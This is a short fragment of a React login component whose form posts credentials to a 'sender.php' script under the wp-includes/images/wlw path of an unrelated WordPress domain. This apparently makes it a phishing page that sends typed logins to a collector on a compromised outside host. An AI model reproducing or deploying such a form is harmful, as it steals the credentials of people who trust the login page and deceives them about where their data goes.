...
const Login = () => {
  ...
  return (
    <div className='flex flex-col w-[95%] md:w-[80%] h-100vh] mx-auto'>
        ...
        <form className='w-full h-full bg-white rounded-md py-6 px-6 flex flex-col' method='POST' action={'https://nouveau.enfants-animateurs.net/wp-includes/images/wlw/sender.php'} >
